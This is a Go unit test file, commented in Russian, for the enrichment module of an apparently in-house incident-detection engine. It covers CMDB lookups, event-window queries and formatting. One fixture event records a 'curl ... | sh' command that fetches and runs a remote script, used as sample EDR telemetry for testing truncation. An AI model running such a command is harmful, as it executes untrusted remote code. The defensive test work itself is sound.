package enrich

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/devitex-soft/argus/engine/internal/incidents"
	"github.com/devitex-soft/argus/engine/internal/model"
)

// fakeSource записывает параметры запроса и отдаёт заготовленный ответ.
type fakeSource struct {
	calls []call
	evs   []*model.Event
	err   error
}

type call struct {
	class, node, actor, ip string
	from, to               time.Time
	limit                  int
}

func (f *fakeSource) EventsAround(_ context.Context, class, node, actor, ip string, from, to time.Time, limit int) ([]*model.Event, error) {
	f.calls = append(f.calls, call{class, node, actor, ip, from, to, limit})
	return f.evs, f.err
}

func writeCMDB(t *testing.T, body string) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "cmdb.yml")
	if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	return p
}

func incident() *incidents.Incident {
	return &incidents.Incident{
		IncidentID: "INC-1", Node: "web-01", ActorName: "a.sidorov",
		FirstTS: "2026-09-14 10:00:00.000", LastTS: "2026-09-14 10:05:00.000",
		Events: []*model.Event{{SrcIP: "10.1.2.3"}},
	}
}

func TestNewCMDB(t *testing.T) {
	cases := []struct {
		name  string
		path  func(t *testing.T) string
		nodes int
	}{
		{"без CMDB", func(*testing.T) string { return "" }, 0},
		{"файла нет", func(t *testing.T) string { return filepath.Join(t.TempDir(), "нет.yml") }, 0},
		{"сломанный YAML", func(t *testing.T) string { return writeCMDB(t, "nodes: [unclosed") }, 0},
		{"не тот корень", func(t *testing.T) string { return writeCMDB(t, "hosts:\n  web-01: {owner: x}\n") }, 0},
		{"нормальный", func(t *testing.T) string {
			return writeCMDB(t, "nodes:\n  web-01:\n    owner: Иванов\n    team: web\n    criticality: high\n  db-01:\n    owner: Петров\n")
		}, 2},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			en := New(nil, c.path(t))
			if en == nil {
				t.Fatal("Enricher создаётся всегда, даже без файла")
			}
			if len(en.cmdb) != c.nodes {
				t.Fatalf("узлов в CMDB %d, ожидалось %d", len(en.cmdb), c.nodes)
			}
			// YAML без корня nodes оставляет карту nil — чтение из nil-карты в Go
			// допустимо, Run не должен паниковать и обязан ответить «не найден».
			out := en.Run(context.Background(), incident(), []any{"cmdb.owner"})
			if c.nodes == 0 && (len(out) != 1 || out[0] != "cmdb: узел web-01 в CMDB не найден") {
				t.Fatalf("пустая CMDB: %v", out)
			}
		})
	}
}

func TestRunWithoutTimestamps(t *testing.T) {
	src := &fakeSource{}
	en := New(src, "")
	for _, inc := range []*incidents.Incident{
		{Node: "web-01"},
		{FirstTS: "2026-09-14 10:00:00.000"},
		{FirstTS: "мусор", LastTS: "2026-09-14 10:00:00.000"},
	} {
		if out := en.Run(context.Background(), inc, []any{"edr.process_tree", "cmdb.owner"}); out != nil {
			t.Fatalf("без разборчивых first/last обогащения нет: %v", out)
		}
	}
	if len(src.calls) != 0 {
		t.Fatal("в хранилище не ходим")
	}
}

func TestRunEmptySpec(t *testing.T) {
	en := New(&fakeSource{}, "")
	if out := en.Run(context.Background(), incident(), nil); out != nil {
		t.Fatalf("пустой spec → nil: %v", out)
	}
	if out := en.Run(context.Background(), incident(), []any{}); out != nil {
		t.Fatalf("пустой spec → nil: %v", out)
	}
}

func TestRunWindowsAndParams(t *testing.T) {
	src := &fakeSource{}
	en := New(src, "")
	inc := incident()
	out := en.Run(context.Background(), inc, []any{
		"edr.process_tree",                        // окно по умолчанию 2m
		map[string]any{"ngfw.sessions": "30s"},    // явное окно
		map[string]any{"edr.process_tree": "-5s"}, // отрицательное → по умолчанию
		map[string]any{"ngfw.sessions": "ерунда"}, // неразборчивое → по умолчанию
	})
	if len(src.calls) != 4 {
		t.Fatalf("4 запроса, got %d", len(src.calls))
	}
	first, _ := time.Parse("2006-01-02 15:04:05.000", inc.FirstTS)
	last, _ := time.Parse("2006-01-02 15:04:05.000", inc.LastTS)
	want := []call{
		{"edr", "web-01", "", "", first.Add(-2 * time.Minute), last.Add(2 * time.Minute), 12},
		{"ngfw", "", "a.sidorov", "10.1.2.3", first.Add(-30 * time.Second), last.Add(30 * time.Second), 12},
		{"edr", "web-01", "", "", first.Add(-2 * time.Minute), last.Add(2 * time.Minute), 12},
		{"ngfw", "", "a.sidorov", "10.1.2.3", first.Add(-2 * time.Minute), last.Add(2 * time.Minute), 12},
	}
	for i, c := range src.calls {
		w := want[i]
		if c.class != w.class || c.node != w.node || c.actor != w.actor || c.ip != w.ip || c.limit != w.limit || !c.from.Equal(w.from) || !c.to.Equal(w.to) {
			t.Errorf("запрос %d: %+v, ожидалось %+v", i, c, w)
		}
	}
	// Пустой ответ хранилища — одна строка на источник.
	if len(out) != 4 {
		t.Fatalf("по строке на источник: %v", out)
	}
	for _, line := range out {
		if !strings.HasSuffix(line, ": событий в окне нет") {
			t.Errorf("пустое окно: %q", line)
		}
	}
	if !strings.HasPrefix(out[0], "edr.process_tree:") || !strings.HasPrefix(out[1], "ngfw.sessions:") {
		t.Fatalf("подписи источников: %v", out[:2])
	}
}

func TestRunActorIPFromFirstEvent(t *testing.T) {
	src := &fakeSource{}
	en := New(src, "")
	inc := incident()
	inc.Events = nil
	en.Run(context.Background(), inc, []any{"ngfw.sessions"})
	if src.calls[0].ip != "" {
		t.Fatalf("без событий адрес субъекта пустой: %q", src.calls[0].ip)
	}
}

func TestRunEventsFormatting(t *testing.T) {
	src := &fakeSource{evs: []*model.Event{
		{TS: "2026-09-14 10:01:02.345", Source: "edr.kaspersky", Action: "process.create", Object: "/usr/bin/curl -s http://203.0.113.5/x.sh | sh -c 'echo very long command line here'"},
		{TS: "2026-09-14 10:01:03.000", Source: "ngfw.checkpoint-cluster-01", Action: "session.allow.outbound.long", DstIP: "203.0.113.5", DstPort: 443},
		{TS: "короткий", Source: "edr", Action: "x"},
	}}
	en := New(src, "")
	out := en.Run(context.Background(), incident(), []any{"edr.process_tree"})
	if len(out) != 4 || out[0] != "edr.process_tree: 3 событий за окно" {
		t.Fatalf("заголовок и строки: %v", out)
	}
	// ts — только часы:минуты:секунды; source и action — фиксированная ширина; длинный объект обрезан с «…».
	if !strings.HasPrefix(out[1], "  10:01:02  edr.kaspersky  process.create         ") || !strings.HasSuffix(out[1], "…") {
		t.Errorf("строка события: %q", out[1])
	}
	if !strings.Contains(out[2], "ngfw.checkpoi…") || !strings.Contains(out[2], "session.allow.outboun…") || !strings.HasSuffix(out[2], "203.0.113.5:443") {
		t.Errorf("обрезка source/action и dst:port вместо объекта: %q", out[2])
	}
	if !strings.HasPrefix(out[3], "  короткий  ") {
		t.Errorf("короткий ts остаётся как есть: %q", out[3])
	}
	// Больше 12 событий хранилище не отдаёт — лимит в запросе, здесь только проверяем, что он передан.
	if src.calls[0].limit != 12 {
		t.Fatalf("limit=12, got %d", src.calls[0].limit)
	}
}

func TestRunSourceError(t *testing.T) {
	src := &fakeSource{err: errors.New("clickhouse: timeout")}
	en := New(src, "")
	out := en.Run(context.Background(), incident(), []any{"ngfw.sessions"})
	if len(out) != 1 || out[0] != "ngfw.sessions: ошибка запроса — clickhouse: timeout" {
		t.Fatalf("ошибка хранилища — строкой обогащения, не паникой: %v", out)
	}
}

func TestRunWithoutSource(t *testing.T) {
	// Движок без хранилища (тесты правил): событийные источники молчат, CMDB работает.
	en := New(nil, writeCMDB(t, "nodes:\n  web-01: {owner: Иванов, team: web, criticality: high, note: 'прод'}\n"))
	out := en.Run(context.Background(), incident(), []any{"edr.process_tree", "cmdb.owner"})
	if len(out) != 1 || out[0] != "cmdb: web-01 — владелец Иванов, команда web, критичность high прод" {
		t.Fatalf("только CMDB: %v", out)
	}
}

func TestRunCMDB(t *testing.T) {
	en := New(&fakeSource{}, writeCMDB(t, "nodes:\n  web-01:\n    owner: Иванов\n  db-01:\n    owner: '  '\n    team: dba\n"))
	cases := []struct {
		node string
		want string
	}{
		{"web-01", "cmdb: web-01 — владелец Иванов, команда ?, критичность ? "},
		{"db-01", "cmdb: db-01 — владелец ?, команда dba, критичность ? "}, // пробелы — как пусто
		{"ghost", "cmdb: узел ghost в CMDB не найден"},
	}
	for _, c := range cases {
		inc := incident()
		inc.Node = c.node
		out := en.Run(context.Background(), inc, []any{"cmdb.owner"})
		if len(out) != 1 || out[0] != c.want {
			t.Errorf("%s: %q, ожидалось %q", c.node, out, c.want)
		}
	}
	// Инцидент без узла (правило по субъекту): про CMDB молчим.
	inc := incident()
	inc.Node = ""
	if out := en.Run(context.Background(), inc, []any{"cmdb.owner"}); out != nil {
		t.Fatalf("без узла строки CMDB нет: %v", out)
	}
}

func TestRunUnknownSource(t *testing.T) {
	en := New(&fakeSource{}, "")
	out := en.Run(context.Background(), incident(), []any{"siem.magic", 42, map[string]any{"waf.hits": "1m"}})
	want := []string{"enrich: неизвестный источник siem.magic", "enrich: неизвестный источник 42", "enrich: неизвестный источник waf.hits"}
	if strings.Join(out, "|") != strings.Join(want, "|") {
		t.Fatalf("неизвестные источники перечисляются, не роняют правило: %v", out)
	}
}

func TestParseItem(t *testing.T) {
	cases := []struct {
		in        any
		name, arg string
	}{
		{"edr.process_tree", "edr.process_tree", ""},
		{map[string]any{"ngfw.sessions": "120s"}, "ngfw.sessions", "120s"},
		{map[string]any{"ngfw.sessions": 90}, "ngfw.sessions", "90"},
		{map[string]any{}, "map[]", ""},
		{7, "7", ""},
		{nil, "<nil>", ""},
		{[]any{"a"}, "[a]", ""},
	}
	for _, c := range cases {
		name, arg := parseItem(c.in)
		if name != c.name || arg != c.arg {
			t.Errorf("%v → (%q, %q), ожидалось (%q, %q)", c.in, name, arg, c.name, c.arg)
		}
	}
}

func TestDur(t *testing.T) {
	def := 2 * time.Minute
	cases := map[string]time.Duration{
		"":      def,
		"30s":   30 * time.Second,
		"1h":    time.Hour,
		"1h30m": 90 * time.Minute,
		"0":     def, // ноль — не окно
		"-5s":   def,
		"5":     def, // без единицы ParseDuration не принимает
		"много": def,
	}
	for in, want := range cases {
		if got := dur(in, def); got != want {
			t.Errorf("dur(%q) = %s, ожидалось %s", in, got, want)
		}
	}
}

func TestOr(t *testing.T) {
	if or("", "?") != "?" || or("   ", "?") != "?" || or("\t\n", "?") != "?" {
		t.Fatal("пустое и пробельное — значение по умолчанию")
	}
	if or("x", "?") != "x" || or(" x ", "?") != " x " {
		t.Fatal("непустое возвращается как есть, без обрезки")
	}
}

func TestCut(t *testing.T) {
	if cut("", 5) != "" || cut("abc", 3) != "abc" || cut("abc", 10) != "abc" {
		t.Fatal("короткие строки не трогаем")
	}
	if got := cut("abcdef", 4); got != "abc…" {
		t.Fatalf("обрезка до n с многоточием на месте последнего символа: %q", got)
	}
	// Кириллица режется по рунам: UTF-8 остаётся корректным, длина — в символах.
	got := cut("привет", 5)
	if got != "прив…" || !utf8.ValidString(got) {
		t.Fatalf("cut по рунам: %q", got)
	}
}
